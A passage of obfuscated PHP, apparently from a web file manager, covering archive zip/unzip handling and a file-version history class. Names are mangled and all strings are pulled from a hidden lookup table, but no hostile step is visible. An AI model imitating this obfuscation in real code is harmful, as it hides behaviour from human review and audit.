(is_string($“ÕÈµå) && $“ÕÈµå) { $“ÕÈµå = array(array($äí•›¶[87] => $“ÕÈµå)); } $²¯¼Àâ = self::init($“ÕÈµå[0][$äí•›¶[87]]); $ÆŞöâ¶ = self::info($“ÕÈµå[0][$äí•›¶[87]]); $Àâ¸“İ½ = $äí•›¶[12]; $®‰íåİ = $äí•›¶[12]; $Óùü¸¶½ = $äí•›¶[12]; if ($†••ş’ && substr($†••ş’, -1, 1) != $äí•›¶[8]) { $®‰íåİ = get_path_father($†••ş’); $Óùü¸¶½ = get_path_this($†••ş’); } else { $®‰íåİ = self::pathFather($ÆŞöâ¶[$äí•›¶[87]]); $Óùü¸¶½ = $ÆŞöâ¶[$äí•›¶[32]] . $äí•›¶[10] . $üüıŞØÀ; if (count($“ÕÈµå) > 1) { $ÙÈ‹¨å— = IO::info($®‰íåİ); $Óùü¸¶½ = $ÙÈ‹¨å—[$äí•›¶[32]] . $äí•›¶[10] . $üüıŞØÀ; } if ($†••ş’) { $®‰íåİ = $†••ş’; } } if ($²¯¼Àâ->getType() == $äí•›¶[109]) { $•ÛïÜÖÁ = self::init($®‰íåİ); $Ó©Ù„¼İ = $•ÛïÜÖÁ->getType() == $äí•›¶[109] ? $®‰íåİ : get_path_father($²¯¼Àâ->path); $Ó©Ù„¼İ = rtrim($Ó©Ù„¼İ, $äí•›¶[8]) . $äí•›¶[8]; mk_dir($Ó©Ù„¼İ); } else { $Àâ¸“İ½ = TEMP_FILES . $äí•›¶[1252] . time() . rand_string(8) . $äí•›¶[8]; mk_dir($Àâ¸“İ½); file_put_contents($Àâ¸“İ½ . $äí•›¶[1253], $äí•›¶[12]); $Ó©Ù„¼İ = $Àâ¸“İ½; } $ÕÎ¼¶à‚ = IO::info($Ó©Ù„¼İ); if (!$ÕÎ¼¶à‚ || !$ÕÎ¼¶à‚[$äí•›¶[233]]) { show_json(LNG($äí•›¶[1254]), !1); } $›íéûˆÃ = self::zipFileList($“ÕÈµå, $Àâ¸“İ½); foreach ($›íéûˆÃ as $ÆÌÙÄ => $®ÊğÍÍ«) { $›íéûˆÃ[$ÆÌÙÄ] = self::iconvSystem($®ÊğÍÍ«); } $ô­¬â¹¬ = get_filename_auto($Ó©Ù„¼İ . $Óùü¸¶½, $äí•›¶[12], $‹¬¹ŠÈ´); KodArchive::create(self::iconvSystem($ô­¬â¹¬), $›íéûˆÃ); if (!IO::exist($ô­¬â¹¬)) { if ($Àâ¸“İ½) { del_dir($Àâ¸“İ½); } write_log($äí•›¶[1255] . $ô­¬â¹¬, $äí•›¶[389]); show_json(LNG($äí•›¶[1256]), !1); } if (!$Àâ¸“İ½) { return $ô­¬â¹¬; } $ùØ²¶â = self::move($ô­¬â¹¬, $®‰íåİ, $‹¬¹ŠÈ´); if ($Àâ¸“İ½) { del_dir($Àâ¸“İ½); } if (!$ô­¬â¹¬) { write_log($äí•›¶[1257] . $ô­¬â¹¬ . $äí•›¶[1258] . $®‰íåİ, $äí•›¶[389]); show_json(LNG($äí•›¶[1256]), !1); } return $ùØ²¶â; } public static function unzip($îîÛÁã, $¼²šÚ¼Ô, $ÉÆÔ‹× = "\x2d\61", $Ê¦»©—† = "\162\x65\160\154\x61\x63\x65") { $‚ÈâÙ´™ =& $_SERVER[óÔë„ú]; $ğÅÏ ‰Ü = parent::info($îîÛÁã); if (!$ğÅÏ ‰Ü) { show_json(LNG($‚ÈâÙ´™[1259]), !1); } $Î‘½Ï = IO::infoFullSimple($¼²šÚ¼Ô); if (!$Î‘½Ï) { $¼²šÚ¼Ô = IO::mkdir($¼²šÚ¼Ô); } if (isset($Î‘½Ï[$‚ÈâÙ´™[193]]) && trim($Î‘½Ï[$‚ÈâÙ´™[87]], $‚ÈâÙ´™[8]) != trim($¼²šÚ¼Ô, $‚ÈâÙ´™[8])) { $®ùíÈ¹ = KodIO::make($Î‘½Ï[$‚ÈâÙ´™[192]]); $»ê›³ä´ = IO::fileNameAuto($®ùíÈ¹, $Î‘½Ï[$‚ÈâÙ´™[32]], REPEAT_RENAME_FOLDER, !0); $¼²šÚ¼Ô = IO::mkdir($®ùíÈ¹ . $»ê›³ä´); } $ÉÆÔ‹× = $ÉÆÔ‹× && $ÉÆÔ‹× != $‚ÈâÙ´™[1260] ? @json_decode($ÉÆÔ‹×, !0) : -1; $Øë‹ùÍç = self::unzipPart($îîÛÁã, $ÉÆÔ‹×); if (!$Øë‹ùÍç || !IO::exist($Øë‹ùÍç[$‚ÈâÙ´™[230]])) { show_json(LNG($‚ÈâÙ´™[108]), !1); } $ÀÛ¸³ÌÒ = $Øë‹ùÍç[$‚ÈâÙ´™[1261]][count($Øë‹ùÍç[$‚ÈâÙ´™[1261]]) - 1]; if ($ÀÛ¸³ÌÒ[$‚ÈâÙ´™[1262]] == -1 || substr($ÀÛ¸³ÌÒ[$‚ÈâÙ´™[32]], -1, 1) == $‚ÈâÙ´™[8]) { $Ÿè¶ÖŒğ = $Øë‹ùÍç[$‚ÈâÙ´™[1263]] . rand_string(10) . $‚ÈâÙ´™[8]; mk_dir($Ÿè¶ÖŒğ); $òÌ‰ÇŞş = count($Øë‹ùÍç[$‚ÈâÙ´™[1261]]) == 1 ? IO::ext($îîÛÁã) : get_path_ext($Øë‹ùÍç[$‚ÈâÙ´™[230]]); $ñ´Ğå ¨ = KodArchive::extract(self::iconvSystem($Øë‹ùÍç[$‚ÈâÙ´™[230]]), $Ÿè¶ÖŒğ, $ÀÛ¸³ÌÒ[$‚ÈâÙ´™[1262]], $»ê›³ä´, $òÌ‰ÇŞş); self::unzipErrorCheck($ñ´Ğå ¨, array($‚ÈâÙ´™[1264], $îîÛÁã, $òÌ‰ÇŞş, $¼²šÚ¼Ô, $Øë‹ùÍç)); Hook::trigger($‚ÈâÙ´™[1265], $Ÿè¶ÖŒğ); recursion_dir($Ÿè¶ÖŒğ, $†—Ôšø«, $ÊõàòÎ, 0); $à¦úÅóÃ = array_merge($†—Ôšø«, $ÊõàòÎ); $÷±‘¶Ã® = array(); foreach ($à¦úÅóÃ as $èÚ‹ÙÚù) { $ÍåàÃê¾ = IO::move(self::iconvApp($èÚ‹ÙÚù), $¼²šÚ¼Ô, $Ê¦»©—†); if ($ÍåàÃê¾) { $÷±‘¶Ã®[] = $ÍåàÃê¾; } } del_dir($Ÿè¶ÖŒğ); } else { $ÍåàÃê¾ = IO::move($Øë‹ùÍç[$‚ÈâÙ´™[230]], $¼²šÚ¼Ô, $Ê¦»©—†, get_path_this($ÀÛ¸³ÌÒ[$‚ÈâÙ´™[32]])); if ($ÍåàÃê¾) { $÷±‘¶Ã®[] = $ÍåàÃê¾; } } return $÷±‘¶Ã® ? $÷±‘¶Ã® : !1; } public static function unzipList($ƒàáûí¿) { $³ïÀ·ˆŞ =& $_SERVER[óÔë„ú]; $³ŒÇğ–Ä = isset($ƒàáûí¿[$³ïÀ·ˆŞ[1266]]) ? $ƒàáûí¿[$³ïÀ·ˆŞ[1266]] : !1; $Ş»öø“ = isset($ƒàáûí¿[$³ïÀ·ˆŞ[1262]]) ? @json_decode($ƒàáûí¿[$³ïÀ·ˆŞ[1262]], !0) : -1; $²£ÒªÈ¾ = self::unzipPart($ƒàáûí¿[$³ïÀ·ˆŞ[87]], $Ş»öø“); if (!$²£ÒªÈ¾ || !IO::exist($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]])) { show_json(LNG($³ïÀ·ˆŞ[108]), !1); } $ÚÔÎÙÏ¾ = $²£ÒªÈ¾[$³ïÀ·ˆŞ[1261]][count($²£ÒªÈ¾[$³ïÀ·ˆŞ[1261]]) - 1]; $„µóà¹€ = in_array(IO::ext($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]]), array($³ïÀ·ˆŞ[389], $³ïÀ·ˆŞ[1267], $³ïÀ·ˆŞ[1268], $³ïÀ·ˆŞ[1269], $³ïÀ·ˆŞ[1270], $³ïÀ·ˆŞ[1271])); if (!$³ŒÇğ–Ä && ($ÚÔÎÙÏ¾[$³ïÀ·ˆŞ[1262]] == -1 || $„µóà¹€)) { $¨§¾èŠ = $²£ÒªÈ¾[$³ïÀ·ˆŞ[1263]] . get_path_this($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]]) . $³ïÀ·ˆŞ[1272]; if (!IO::exist($¨§¾èŠ)) { $˜ƒšĞ™é = $ÚÔÎÙÏ¾[$³ïÀ·ˆŞ[1262]] == -1 ? get_path_ext(IO::pathThis($ƒàáûí¿[$³ïÀ·ˆŞ[87]])) : get_path_ext($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]]); $¬÷ØØ½Š = KodArchive::listContent(self::iconvSystem($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]]), !0, $˜ƒšĞ™é); self::unzipErrorCheck($¬÷ØØ½Š, array($³ïÀ·ˆŞ[1273], $ƒàáûí¿, $²£ÒªÈ¾)); @file_put_contents($¨§¾èŠ, json_encode($¬÷ØØ½Š[$³ïÀ·ˆŞ[1274]])); } return @json_decode(IO::getContent($¨§¾èŠ), !0); } IO::fileOut($²£ÒªÈ¾[$³ïÀ·ˆŞ[230]], $³ŒÇğ–Ä, get_path_this($ÚÔÎÙÏ¾[$³ïÀ·ˆŞ[32]])); die; } private static function zipFileList($˜ş‚‰ò, $ùåœí¦Ã = false) { $‘ıüË«  =& $_SERVER[óÔë„ú]; $ûàã©½ = array(); foreach ($˜ş‚‰ò as $Íµ‹³µ) { $ûëœôÀı = $Íµ‹³µ[$‘ıüË« [87]]; if ($ùåœí¦Ã) { $ûëœôÀı = self::copy($Íµ‹³µ[$‘ıüË« [87]], $ùåœí¦Ã, $‘ıüË« [878]); } else { $³Îó·»Œ = self::init($Íµ‹³µ[$‘ıüË« [87]]); if ($³Îó·»Œ->getType() == $‘ıüË« [109]) { $ûëœôÀı = $³Îó·»Œ->path; } } if ($ûëœôÀı && self::local()->exist($ûëœôÀı)) { $ûàã©½[$Íµ‹³µ[$‘ıüË« [87]]] = $ûëœôÀı; } } if (!empty($ûàã©½)) { return array_values($ûàã©½); } show_json(LNG($‘ıüË« [1231]), !1); } private static function localFilePath($íµæÚòí) { $ÃÌÛ’Òü =& $_SERVER[óÔë„ú]; $‡èéì÷Ÿ = KodIO::parse($íµæÚòí); if ($‡èéì÷Ÿ[$ÃÌÛ’Òü[33]] == KodIO::KOD_SOURCE) { $«¢½ğşŠ = Model($ÃÌÛ’Òü[884])->fileInfoGet(KodIO::sourceID($íµæÚòí)); if (!$«¢½ğşŠ[$ÃÌÛ’Òü[87]]) { show_json($ÃÌÛ’Òü[1275], !1); } $íµæÚòí = $«¢½ğşŠ[$ÃÌÛ’Òü[87]]; } $Ù…¨ö¸™ = self::init($íµæÚòí); if ($Ù…¨ö¸™->pathParse[$ÃÌÛ’Òü[1217]]) { $íµæÚòí = $Ù…¨ö¸™->pathParse[$ÃÌÛ’Òü[1217]]; $Ù…¨ö¸™ = self::init($íµæÚòí); } $Ù¿ÇŒı = $Ù…¨ö¸™->getType(); if ($Ù¿ÇŒı == $ÃÌÛ’Òü[109] || $Ù¿ÇŒı == $ÃÌÛ’Òü[1276]) { if (!$Ù…¨ö¸™->exist($Ù…¨ö¸™->path)) { show_json(LNG($ÃÌÛ’Òü[108]), !1); } return $Ù…¨ö¸™->path; } return !1; } public static function unzipPart($È‰‰øï, $óäÑû°¦ = -1) { $Ã±·¿àã =& $_SERVER[óÔë„ú]; $å–şœ§ƒ = IO::pathThis($È‰‰øï); if (!$óäÑû°¦ || $óäÑû°¦ == -1) { $Í®àèÖ‰ = array(array($Ã±·¿àã[32] => $å–şœ§ƒ, $Ã±·¿àã[1262] => -1)); $Í®àèÖ‰[0][$Ã±·¿àã[1277]] = $Í®àèÖ‰[0][$Ã±·¿àã[32]]; } else { if (is_array($óäÑû°¦)) { $Í®àèÖ‰ = $óäÑû°¦; $Å„İÊü÷ = count($Í®àèÖ‰) - 1; for ($—Íøæ¥Å = 0; $—Íøæ¥Å <= $Å„İÊü÷; $—Íøæ¥Å++) { $âÀ¨À÷ô = $Í®àèÖ‰[$—Íøæ¥Å]; $åš¶Šƒ = get_path_this($âÀ¨À÷ô[$Ã±·¿àã[32]]) . (checkExtSafe($âÀ¨À÷ô[$Ã±·¿àã[32]]) ? $Ã±·¿àã[12] : $Ã±·¿àã[1278]); $Í®àèÖ‰[$—Íøæ¥Å][$Ã±·¿àã[1277]] = $Ã±·¿àã[1279] . intval($âÀ¨À÷ô[$Ã±·¿àã[1262]]) . $Ã±·¿àã[462] . $åš¶Šƒ; if ($—Íøæ¥Å == 0) { continue; } $Í®àèÖ‰[$—Íøæ¥Å][$Ã±·¿àã[1277]] = $Í®àèÖ‰[$—Íøæ¥Å - 1][$Ã±·¿àã[1277]] . $Ã±·¿àã[1280] . $Í®àèÖ‰[$—Íøæ¥Å][$Ã±·¿àã[1277]]; } } } if (!is_array($Í®àèÖ‰) || count($Í®àèÖ‰) == 0) { return !1; } $öµ¾Şğ˜ = $Í®àèÖ‰[count($Í®àèÖ‰) - 1]; if (!IO::exist($È‰‰øï)) { return !1; } $°Ÿü£Ø = TEMP_FILES . $Ã±·¿àã[1281] . kodIO::hashPathSafe($È‰‰øï) . $Ã±·¿àã[8]; $“ÔÁ»¦¹ = $°Ÿü£Ø . $öµ¾Şğ˜[$Ã±·¿àã[1277]]; mk_dir($°Ÿü£Ø); file_put_contents(TEMP_FILES . $Ã±·¿àã[1253], $Ã±·¿àã[12]); if (IO::exist($“ÔÁ»¦¹)) { return array($Ã±·¿àã[230] => $“ÔÁ»¦¹, $Ã±·¿àã[1261] => $Í®àèÖ‰, $Ã±·¿àã[1263] => $°Ÿü£Ø); } $§ı¥šÔÉ = self::localFilePath($È‰‰øï); if (!$§ı¥šÔÉ) { $§ı¥šÔÉ = $°Ÿü£Ø . $Ã±·¿àã[1282]; if (!IO::exist($§ı¥šÔÉ)) { self::copy($È‰‰øï, $°Ÿü£Ø, !1, get_path_this($§ı¥šÔÉ)); } } if (!$§ı¥šÔÉ || !IO::exist($§ı¥šÔÉ)) { return !1; } if ($öµ¾Şğ˜[$Ã±·¿àã[1262]] == -1) { return array($Ã±·¿àã[230] => $§ı¥šÔÉ, $Ã±·¿àã[1261] => $Í®àèÖ‰, $Ã±·¿àã[1263] => $°Ÿü£Ø); } $éè‚Ä‡˜ = $§ı¥šÔÉ; foreach ($Í®àèÖ‰ as $—Íøæ¥Å => $âÀ¨À÷ô) { if (!$âÀ¨À÷ô || $âÀ¨À÷ô[$Ã±·¿àã[1262]] == $Ã±·¿àã[1260]) { break; } if (substr($âÀ¨À÷ô[$Ã±·¿àã[32]], -1, 1) == $Ã±·¿àã[8]) { break; } $õİÃÃ™Õ = in_array(get_path_ext($âÀ¨À÷ô[$Ã±·¿àã[1277]]), array($Ã±·¿àã[389], $Ã±·¿àã[1267], $Ã±·¿àã[1268], $Ã±·¿àã[1269], $Ã±·¿àã[1270], $Ã±·¿àã[1271])); $‘¨ÇãæØ = $—Íøæ¥Å == count($Í®àèÖ‰) - 1 && $õİÃÃ™Õ; $ş¤î ±° = $°Ÿü£Ø . $âÀ¨À÷ô[$Ã±·¿àã[1277]]; $Âêä£ = $°Ÿü£Ø . get_path_this($âÀ¨À÷ô[$Ã±·¿àã[32]]); if (IO::exist($ş¤î ±°)) { $éè‚Ä‡˜ = $ş¤î ±°; continue; } $¸¾äÇ¨Ú = $—Íøæ¥Å == 0 ? get_path_ext($å–şœ§ƒ) : get_path_ext($éè‚Ä‡˜); $—¾ÈìÄ = KodArchive::extract(self::iconvSystem($éè‚Ä‡˜), $°Ÿü£Ø, $âÀ¨À÷ô[$Ã±·¿àã[1262]], $ÆÃŒÃÒê, $¸¾äÇ¨Ú); self::unzipErrorCheck($—¾ÈìÄ, array($Ã±·¿àã[1283], $È‰‰øï, $Í®àèÖ‰, $âÀ¨À÷ô, $ş¤î ±°)); if (IO::exist($Âêä£)) { IO::rename($Âêä£, get_path_this($ş¤î ±°)); } $éè‚Ä‡˜ = $ş¤î ±°; } $“ÔÁ»¦¹ = $éè‚Ä‡˜; return array($Ã±·¿àã[230] => $éè‚Ä‡˜, $Ã±·¿àã[1261] => $Í®àèÖ‰, $Ã±·¿àã[1263] => $°Ÿü£Ø); } private static function unzipErrorCheck($ß¨ŞÊ“«, $ªø€Çò‡ = false) { $„ÕäõŸŞ =& $_SERVER[óÔë„ú]; if ($ß¨ŞÊ“«[$„ÕäõŸŞ[1284]]) { return !0; } write_log(array($„ÕäõŸŞ[1285], $ß¨ŞÊ“«, $ªø€Çò‡), $„ÕäõŸŞ[1286]); show_json($„ÕäõŸŞ[1287] . json_encode($ß¨ŞÊ“«[$„ÕäõŸŞ[1274]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Á¤ˆÕ±È =& $_SERVER[óÔë„ú]; $ùòÖƒŠÆ = $GLOBALS[$Á¤ˆÕ±È[6]][$Á¤ˆÕ±È[92]]; if ($ùòÖƒŠÆ[$Á¤ˆÕ±È[1288]] != 1) { return; } if ($ùòÖƒŠÆ[$Á¤ˆÕ±È[1289]] <= 0) { return; } if (isset($_REQUEST[$Á¤ˆÕ±È[1290]]) && $_REQUEST[$Á¤ˆÕ±È[1290]] == $Á¤ˆÕ±È[91]) { return; } Hook::bind($Á¤ˆÕ±È[1291], $Á¤ˆÕ±È[1292]); Hook::bind($Á¤ˆÕ±È[1293], $Á¤ˆÕ±È[1294]); Hook::bind($Á¤ˆÕ±È[1295], $Á¤ˆÕ±È[1296]); Hook::bind($Á¤ˆÕ±È[1297], $Á¤ˆÕ±È[1298]); Hook::bind($Á¤ˆÕ±È[1299], $Á¤ˆÕ±È[1300]); Hook::bind($Á¤ˆÕ±È[1301], $Á¤ˆÕ±È[1302]); } public static function eventBeforeUpload($ƒ´åÜ’) { if ($ƒ´åÜ’[3] && $ƒ´åÜ’[3] != REPEAT_REPLACE) { return; } $±Æå«¢œ = self::parsePath($ƒ´åÜ’[0]); if (!$±Æå«¢œ) { return; } self::add($±Æå«¢œ); } public static function eventBeforeEdit($ƒş°ã¼±) { $³²ø•“ = self::parsePath($ƒş°ã¼±[0]); if (!$³²ø•“) { return; } self::add($³²ø•“); } public static function eventBeforeCopyFile($øÊÖö¹¸, $áï§“¤Ä, $Ë­»çóÀ, $”¢Êø§ø, $øØĞ©âà, $Ÿ†‘öºÜ) { $ïı‡üÁ… =& $_SERVER[óÔë„ú]; if (isset($Ë­»çóÀ->_data[$ïı‡üÁ…[1221]]) && $Ë­»çóÀ->_data[$ïı‡üÁ…[1221]]) { return; } $³Ê”ˆŸ = $Ë­»çóÀ->getPathOuter($”¢Êø§ø); $Àƒšíî = self::parsePath($³Ê”ˆŸ); if (!$Àƒšíî) { return; } self::add($Àƒšíî); } public static function eventBeforeRename($·‡ÊÜ) { $ıÌ—÷ë =& $_SERVER[óÔë„ú]; $ë»ñ¹²« = self::parsePath($·‡ÊÜ[0]); if (!$ë»ñ¹²«) { return; } $°®Ç›Å¢ = self::checkInHistory($ë»ñ¹²«); if (!$°®Ç›Å¢) { return; } if ($°®Ç›Å¢[$ıÌ—÷ë[33]] == $ıÌ—÷ë[230]) { $ñ¾²Á¼ú = self::listData($ë»ñ¹²«); if ($ñ¾²Á¼ú && $ñ¾²Á¼ú[$ıÌ—÷ë[445]]) { self::moveHistory($ë»ñ¹²«, $·‡ÊÜ[1]); } } else { IO::rename($°®Ç›Å¢[$ıÌ—÷ë[87]], $·‡ÊÜ[1]); } } public static function eventBeforeMove($×Ğ·‚›ˆ) { $¢í‹èüÒ =& $_SERVER[óÔë„ú]; $ßœß°•® = self::parsePath($×Ğ·‚›ˆ[0]); if (!$ßœß°•®) { return; } $òË²Û˜ê = self::parsePath($×Ğ·‚›ˆ[1]); if (!$òË²Û˜ê) { return; } $ôÕòîü  = $×Ğ·‚›ˆ[3]; $åÎÅµ¨£ = self::checkInHistory($ßœß°•®); if (!$åÎÅµ¨£) { return; } $ĞÊÅ­Ä– = self::pathHistory($òË²Û˜ê); if ($åÎÅµ¨£[$¢í‹èüÒ[33]] == $¢í‹èüÒ[230]) { $îĞŒ©’Ä = self::listData($ßœß°•®); $˜ğ©§Öî = rtrim($òË²Û˜ê, $¢í‹èüÒ[8]) . $¢í‹èüÒ[8] . ($ôÕòîü  ? $ôÕòîü  : get_path_this($ßœß°•®)); $¸Äø¶­Ş = self::listData($˜ğ©§Öî); if ($îĞŒ©’Ä && $îĞŒ©’Ä[$¢í‹èüÒ[445]] && $¸Äø¶­Ş && $¸Äø¶­Ş[$¢í‹èüÒ[445]]) { return self::clear($ßœß°•®); } if ($îĞŒ©’Ä && $îĞŒ©’Ä[$¢í‹èüÒ[445]]) { self::moveHistory($ßœß°•®, $ôÕòîü , $ĞÊÅ­Ä–); } } else { IO::move($åÎÅµ¨£[$¢í‹èüÒ[87]], $ĞÊÅ­Ä–, !1, $ôÕòîü ); self::clearEmptyFolder(IO::pathFather($åÎÅµ¨£[$¢í‹èüÒ[87]])); } } public static function eventAfterRemove($¹Í¶ûÈ°, $‚Ê‰«¤ü) { $Œã£ªÄ— =& $_SERVER[óÔë„ú]; if (!$‚Ê‰«¤ü) { return; } $ïöì€ = self::parsePath($¹Í¶ûÈ°[0]); if (!$ïöì€) { return; } $†ÀìÇ = self::checkInHistory($ïöì€); if (!$†ÀìÇ) { return; } if ($†ÀìÇ[$Œã£ªÄ—[33]] == $Œã£ªÄ—[230]) { $ùşÂâÆÄ = self::listData($ïöì€, !1); if ($ùşÂâÆÄ && $ùşÂâÆÄ[$Œã£ªÄ—[445]]) { self::clear($ïöì€, !1); } } else { IO::remove($†ÀìÇ[$Œã£ªÄ—[87]]); self::clearEmptyFolder(IO::pathFather($†ÀìÇ[$Œã£ªÄ—[87]])); } } private static function checkInHistory($¨Ğ“òû) { $›¦‘èÆ½ = self::pathHistory($¨Ğ“òû); if (!IO::exist($›¦‘èÆ½)) { $›¦‘èÆ½ .= $_SERVER[óÔë„ú][1303]; } return IO::exist($›¦‘èÆ½) ? IO::info($›¦‘èÆ½) : !1; } private static function parsePath($à¦¾¼ê) { $Ç³ù„â€ =& $_SERVER[óÔë„ú]; if (!$à¦¾¼ê) { return !1; } if (isset($GLOBALS[$Ç³ù„â€[1304]]) && $GLOBALS[$Ç³ù„â€[1304]]) { return; } $‘Ø•¬”Ñ = KodIO::parse($à¦¾¼ê); $˜—àçäã = $‘Ø•¬”Ñ[$Ç³ù„â€[33]]; $Æ—Ü³€½ = !$˜—àçäã || $˜—àçäã == KodIO::KOD_IO || $˜—àçäã == KodIO::KOD_SHARE_ITEM; if (!$Æ—Ü³€½ || !$‘Ø•¬”Ñ[$Ç³ù„â€[1305]]) { return !1; } if (substr($à¦¾¼ê, 0, strlen(DATA_PATH . $Ç³ù„â€[1306])) == DATA_PATH . $Ç³ù„â€[1306]) { return !1; } if ($˜—àçäã == KodIO::KOD_SHARE_ITEM) { $ÖÜôó‹ = IO::init($à¦¾¼ê); if ($ÖÜôó‹->pathParse[$Ç³ù„â€[1217]]) { return self::parsePath($ÖÜôó‹->pathParse[$Ç³ù„â€[1217]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¬ŸÄµ³ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ç³ù„â€[1307]); foreach ($¬ŸÄµ³ as $ÓÛ¾¡) { if (!$˜—àçäã && substr($à¦¾¼ê, 0, strlen($ÓÛ¾¡)) == $ÓÛ¾¡) { return !1; } } self::log($GLOBALS[$Ç³ù„â€[1212]] . $Ç³ù„â€[1308] . $à¦¾¼ê); return $à¦¾¼ê; } private static function pathHistory($æ¬‰ğ¹¯) { $Üïü…½Ÿ =& $_SERVER[óÔë„ú]; $òû²áÄö = self::$_historyBase . ltrim(KodIO::clear($æ¬‰ğ¹¯), $Üïü…½Ÿ[8]); $òû²áÄö = str_replace(array($Üïü…½Ÿ[1309]), array($Üïü…½Ÿ[1310]), $òû²áÄö); return $òû²áÄö; } public static function log($¸µñî¹ˆ) { } public static function historyCount($‚ÏúéĞª) { $·ëò…äÊ =& $_SERVER[óÔë„ú]; $›Ôƒ€ôğ = array(); $ô®¿È™Û = array(); foreach ($‚ÏúéĞª as $¨âòîĞº) { $»–°÷Ù¿ = get_path_father($¨âòîĞº); if (!$ô®¿È™Û[$»–°÷Ù¿]) { $ô®¿È™Û[$»–°÷Ù¿] = array(); } $ô®¿È™Û[$»–°÷Ù¿][] = get_path_this($¨âòîĞº); } foreach ($ô®¿È™Û as $»–°÷Ù¿ => $’õ´Òµ³) { $Û¾ïÒ¢ = self::parsePath($»–°÷Ù¿); if (!$Û¾ïÒ¢) { continue; } foreach ($’õ´Òµ³ as $ïØŸÛè²) { $õ÷Ï´Ó¼ = self::listData(rtrim($Û¾ïÒ¢, $·ëò…äÊ[8]) . $·ëò…äÊ[8] . $ïØŸÛè², !1); if ($õ÷Ï´Ó¼ && $õ÷Ï´Ó¼[$·ëò…äÊ[445]]) { $›Ôƒ€ôğ[rtrim($»–°÷Ù¿, $·ëò…äÊ[8]) . $·ëò…äÊ[8] . $ïØŸÛè²] = count($õ÷Ï´Ó¼[$·ëò…äÊ[445]]); } } } return $›Ôƒ€ôğ; } public static function add($èŸ²Æ‚ã) { $‰âîöÜÆ =& $_SERVER[óÔë„ú]; $Ø½Î¨¤ú = self::listData($èŸ²Æ‚ã); if (!$Ø½Î¨¤ú) { return; } $×ƒ×ßÚï = Model($‰âîöÜÆ[830])->get($‰âîöÜÆ[1311]); $©±¨¸¤ = intval($GLOBALS[$‰âîöÜÆ[6]][$‰âîöÜÆ[92]][$‰âîöÜÆ[1289]]); $¡ªš¢—ş = $×ƒ×ßÚï == $‰âîöÜÆ[1312] ? min(5, $©±¨¸¤) : $©±¨¸¤; if ($©±¨¸¤ <= 0) { return; } $ƒ¸µúª– = IO::info($èŸ²Æ‚ã); $»…„ë™ò = $Ø½Î¨¤ú[$‰âîöÜÆ[445]]; if ($ƒ¸µúª–[$‰âîöÜÆ[79]] == 0) { return; } if ($ƒ¸µúª–[$‰âîöÜÆ[79]] >= 1024 * 1024 * 500) { return !1; } $Ü®õ†¶» = IO::hashSimple($èŸ²Æ‚ã); if ($»…„ë™ò && $»…„ë™ò[0][$‰âîöÜÆ[672]] == $Ü®õ†¶») { return !0; } if (array_key_exists($‰âîöÜÆ[233], $ƒ¸µúª–) && !$ƒ¸µúª–[$‰âîöÜÆ[233]]) { return !1; } $ßœ·Ä³± = short_id(time()); $âìÄÎÏ´ = array($‰âîöÜÆ[475] => $ßœ·Ä³±, $‰âîöÜÆ[672] => $Ü®õ†¶», $‰âîöÜÆ[32] => $ƒ¸µúª–[$‰âîöÜÆ[32]] . $‰âîöÜÆ[10] . date($‰âîöÜÆ[1313]) . rand_string(1), $‰âîöÜÆ[79] => $ƒ¸µúª–[$‰âîöÜÆ[79]], $‰âîöÜÆ[527] => USER_ID, $‰âîöÜÆ[231] => time(), $‰âîöÜÆ[1314] => $‰âîöÜÆ[12]); IO::mkdir($Ø½Î¨¤ú[$‰âîöÜÆ[1315]]); $¥½ñ¢Õ = IO::copy($èŸ²Æ‚ã, $Ø½Î¨¤ú[$‰âîöÜÆ[1315]], !1, $âìÄÎÏ´[$‰âîöÜÆ[32]]); if (!$¥½ñ¢Õ) { self::clearEmptyFolder($Ø½Î¨¤ú[$‰âîöÜÆ[1315]]); return !1; } array_unshift($»…„ë™ò, $âìÄÎÏ´); if (count($»…„ë™ò) > $¡ªš¢—ş) { $ğş“î–Î = array_slice($»…„ë™ò, $¡ªš¢—ş); foreach ($ğş“î–Î as $ÔÏ¢Ú€û) { IO::remove($Ø½Î¨¤ú[$‰âîöÜÆ[1315]] . $ÔÏ¢Ú€û[$‰âîöÜÆ[32]]); } $»…„ë™ò = array_slice($»…„ë™ò, 0, $¡ªš¢—ş); } return self::saveData($Ø½Î¨¤ú[$‰âîöÜÆ[1316]], $»…„ë™ò); } public static function remove($ˆÔ¹ö‰, $ò”á¾”Á) { $‡¿ÒÀæ =& $_SERVER[óÔë„ú]; $·‹¸¡À = self::listData($ˆÔ¹ö‰); $ˆ Åâ¾Å = array(); if (!$·‹¸¡À) { return !1; } foreach ($·‹¸¡À[$‡¿ÒÀæ[445]] as $”´ÑÂÖã) { if ($”´ÑÂÖã[$‡¿ÒÀæ[475]] == $ò”á¾”Á) { IO::remove($·‹¸¡À[$‡¿ÒÀæ[1315]] . $”´ÑÂÖã[$‡¿ÒÀæ[32]]); continue; } $ˆ Åâ¾Å[] = $”´ÑÂÖã; } return self::saveData($·‹¸¡À[$‡¿ÒÀæ[1316]], $ˆ Åâ¾Å); } public static function clear($ú‚›¤¨ø, $Å‹® ® = true) { $àâÖÃ¯È =& $_SERVER[óÔë„ú]; $Û¼Ê¯Õ¯ = self::listData($ú‚›¤¨ø, $Å‹® ®); if (!$Û¼Ê¯Õ¯) { return !1; } foreach ($Û¼Ê¯Õ¯[$àâÖÃ¯È[445]] as $šşª¿Ö) { IO::remove($Û¼Ê¯Õ¯[$àâÖÃ¯È[1315]] . $šşª¿Ö[$àâÖÃ¯È[32]]); } return self::saveData($Û¼Ê¯Õ¯[$àâÖÃ¯È[1316]], array()); } public static function moveHistory($ÕÚ£¡‘¤, $ÁÙîÕµÚ = '', $ĞÆ§ƒğ = '') { $ƒá¨ßƒ¶ =& $_SERVER[óÔë„ú]; $ç™÷«Ñ“ = self::listData($ÕÚ£¡‘¤, !1); if (!$ç™÷«Ñ“ || !$ç™÷«Ñ“[$ƒá¨ßƒ¶[445]]) { return !1; } $Ãî˜üƒ = $ƒá¨ßƒ¶[1303]; $ÁÙîÕµÚ = $ÁÙîÕµÚ ? $ÁÙîÕµÚ : 